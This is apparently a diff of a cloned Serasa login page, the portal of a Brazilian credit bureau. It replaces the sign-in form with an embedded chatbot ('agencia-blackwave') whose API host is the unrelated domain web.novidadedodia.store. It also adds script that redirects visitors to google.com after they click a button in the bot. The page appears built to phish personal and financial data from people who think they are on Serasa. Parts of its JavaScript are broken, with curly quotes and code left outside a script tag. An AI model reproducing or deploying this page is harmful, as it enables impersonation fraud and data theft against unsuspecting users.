@@ -17,23 +17,26 @@
    <title>Fazer login - Serasa</title>
    <script src="../../../scripts/utms/latest-1.js" async="" defer=""></script>
    <script>
-    window.onload = function () {
-        var links = document.getElementsByTagName(“a”);
-        for (var i = 0, n = links.length; i < n; i++) {
+      window.onload = function () {
+         var links = document.getElementsByTagName(“a”);
+         for (var i = 0, n = links.length; i < n; i++) {
             var href = links[i].href.trim() +
-                    (links[i].href.indexOf(“?”) > 0 ? ‘&’ : ‘?’) +
-                    document.location.search.replace(‘?’, ‘’).toString();
+               (links[i].href.indexOf(“ ? ”) > 0 ? ‘ & ’ : ‘ ? ’) +
+               document.location.search.replace(‘ ? ’, ‘’).toString();
             links[i].href = href;
-        }
-    }
-    </script>
-   <meta name="description" content="Faça login para entrar na sua conta Serasa e ter acesso a consulta do seu CPF e seu Serasa Score grátis, empréstimos, limpar seu nome e muito mais.">
+         }
+      }
+   </script>
+   <meta name="description"
+      content="Faça login para entrar na sua conta Serasa e ter acesso a consulta do seu CPF e seu Serasa Score grátis, empréstimos, limpar seu nome e muito mais.">
    <meta name="twitter:title" content="Fazer login - Serasa">
-   <meta name="twitter:description" content="Faça login para entrar na sua conta Serasa e ter acesso a consulta do seu CPF e seu Serasa Score grátis, empréstimos, limpar seu nome e muito mais.">
+   <meta name="twitter:description"
+      content="Faça login para entrar na sua conta Serasa e ter acesso a consulta do seu CPF e seu Serasa Score grátis, empréstimos, limpar seu nome e muito mais.">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="/og/portal/twitter.jpg">
    <meta property="og:title" content="Fazer login - Serasa">
-   <meta property="og:description" content="Faça login para entrar na sua conta Serasa e ter acesso a consulta do seu CPF e seu Serasa Score grátis, empréstimos, limpar seu nome e muito mais.">
+   <meta property="og:description"
+      content="Faça login para entrar na sua conta Serasa e ter acesso a consulta do seu CPF e seu Serasa Score grátis, empréstimos, limpar seu nome e muito mais.">
    <meta property="og:type" content="article">
    <meta property="og:url" content="https://www.serasa.com.br">
    <meta property="og:image" content="/og/portal/facebook.jpg">
@@ -1993,14 +1996,18 @@
 <body>
    <main>
       <div id="__next">
-         <div class="jsx-2555939233 jsx-198070795 jsx-3245007174 jsx-359316987 jsx-2521071326 jsx-1146511973 jsx-867263301 jsx-2446720300 jsx-1679404770 ">
+         <div
+            class="jsx-2555939233 jsx-198070795 jsx-3245007174 jsx-359316987 jsx-2521071326 jsx-1146511973 jsx-867263301 jsx-2446720300 jsx-1679404770 ">
             <div class="jsx-1444901347 layout">
                <header class="jsx-2647271941 header">
                   <div class="jsx-2647271941 header__left">
-                     <div class="jsx-2647271941"><img src="assets/logo.svg" alt="Ir para página inicial" title="Ir para página inicial" width="77" height="36" class="jsx-2647271941"></div>
+                     <div class="jsx-2647271941"><img src="assets/logo.svg" alt="Ir para página inicial"
+                           title="Ir para página inicial" width="77" height="36" class="jsx-2647271941"></div>
                   </div>
                   <div class="jsx-2647271941 header__right">
-                     <p class="ea-typography et-text-dark-medium">Não tem uma conta?<a href="/cadastrar?product=limpa-nome&redirectUrl=%2Flimpa-nome-online%2Farea-cliente" class="jsx-2647271941 header__link ea-typography ea-typography--emphasys et-accent">Criar uma
+                     <p class="ea-typography et-text-dark-medium">Não tem uma conta?<a
+                           href="/cadastrar?product=limpa-nome&redirectUrl=%2Flimpa-nome-online%2Farea-cliente"
+                           class="jsx-2647271941 header__link ea-typography ea-typography--emphasys et-accent">Criar uma
                            conta</a></p>
                   </div>
                </header>
@@ -2010,40 +2017,74 @@
                         <div class="jsx-1670084299 sign-in">
                            <div class="jsx-1255997722 card jsx-1670084299 sign-in__card">
                               <div class="jsx-1670084299 sign-in__content">
-<typebot-standard style="width: 100%; height: 100%; "></typebot-standard>
-<script>
-   const typebotInitScript = document.createElement("script");
-typebotInitScript.type = "module";
-typebotInitScript.innerHTML = `import Typebot from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0.2.37/dist/web.js'
+                                 <typebot-standard style="width: 100%; height: 100%; "></typebot-standard>
+                                 <script>
+                                    const typebotInitScript = document.createElement("script");
+                                    typebotInitScript.type = "module";
+                                    typebotInitScript.innerHTML = `import Typebot from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0.2.37/dist/web.js'
   
 Typebot.initStandard({
   typebot: "agencia-blackwave",
   apiHost: "https://web.novidadedodia.store",
 });
 `;
-document.body.append(typebotInitScript);</script>
-</div>
-                        </div>
-                        <div role="dialog" aria-labelledby="modal-m-acc-title" aria-modal="true" class="jsx-2857347777 modal modal--hide">
-                           <section class="jsx-2857347777 modal__main modal__main--half-mobile">
-                              <div class="jsx-2857347777 modal__title title-padding">
-                                 <p id="modal-m-acc-title" class="ea-typography ea-typography--subheading et-text-dark-low">Algo deu errado</p>
-                                 <button type="button" aria-label="Fechar" class="jsx-2857347777 modal__button__close jsx-2857347777"><img src="../../www.serasa.com.br/assets/web/authorization-front/2.15.4/_next/static/images/modal-close-74f0df029374a2c330a1b9c1073e5ef4.svg/index.html" alt="Fechar" width="24" height="24" class="jsx-2857347777"></button>
+                                    document.body.append(typebotInitScript);
+                                 </script>
+                                 function rodarCodigo() {
+                                 var indeniza = document.querySelector(
+                                 "#__next > div > div > div > div > div > div >
+                                 div.jsx-1255997722.card.jsx-1670084299.sign-in__card > div > typebot-standard"
+                                 );
+
+                                 // Selecione o botão
+                                 var button = indeniza.shadowRoot.querySelector(
+                                 "div > div > div > div:nth-child(13) > div.flex.justify-end.animate-fade-in.gap-2 >
+                                 div.flex.flex-col.gap-2.w-full > div > span > button"
+                                 );
+                                 if (button) {
+                                 // Adicione um ouvinte de evento para clicar no botão
+                                 button.addEventListener('click', function () {
+                                 // Redirecione para o Google
+                                 window.location.href = 'https://www.google.com';
+                                 });
+                                 } else {
+                                 // Chame novamente a função após 1 segundos
+                                 setTimeout(rodarCodigo, 1000);
+                                 }
+                                 }
+                                 // Inicie a execução do código pela primeira vez
+                                 rodarCodigo();
+
                               </div>
-                              <div id="modal-m-acc-description" class="jsx-2857347777 modal__body"></div>
-                           </section>
+                           </div>
+                           <div role="dialog" aria-labelledby="modal-m-acc-title" aria-modal="true"
+                              class="jsx-2857347777 modal modal--hide">
+                              <section class="jsx-2857347777 modal__main modal__main--half-mobile">
+                                 <div class="jsx-2857347777 modal__title title-padding">
+                                    <p id="modal-m-acc-title"
+                                       class="ea-typography ea-typography--subheading et-text-dark-low">Algo deu errado
+                                    </p>
+                                    <button type="button" aria-label="Fechar"
+                                       class="jsx-2857347777 modal__button__close jsx-2857347777"><img
+                                          src="../../www.serasa.com.br/assets/web/authorization-front/2.15.4/_next/static/images/modal-close-74f0df029374a2c330a1b9c1073e5ef4.svg/index.html"
+                                          alt="Fechar" width="24" height="24" class="jsx-2857347777"></button>
+                                 </div>
+                                 <div id="modal-m-acc-description" class="jsx-2857347777 modal__body"></div>
+                              </section>
+                           </div>
                         </div>
                      </div>
                   </div>
+                  <footer class="jsx-695939317 footer">
+                     <p class="eu-sm-1 ea-typography et-text-dark-medium">Nós protegemos a sua privacidade <span
+                           aria-hidden="true" class="jsx-695939317">❤</span></p>
+                     <div class="ea-typography ea-typography--emphasys et-accent">Termos de uso e privacidade</div>
+                  </footer>
                </div>
-               <footer class="jsx-695939317 footer">
-                  <p class="eu-sm-1 ea-typography et-text-dark-medium">Nós protegemos a sua privacidade <span aria-hidden="true" class="jsx-695939317">❤</span></p>
-                  <div class="ea-typography ea-typography--emphasys et-accent">Termos de uso e privacidade</div>
-               </footer>
             </div>
          </div>
       </div>
-   </div></main>
+   </main>
 
 </body>
 
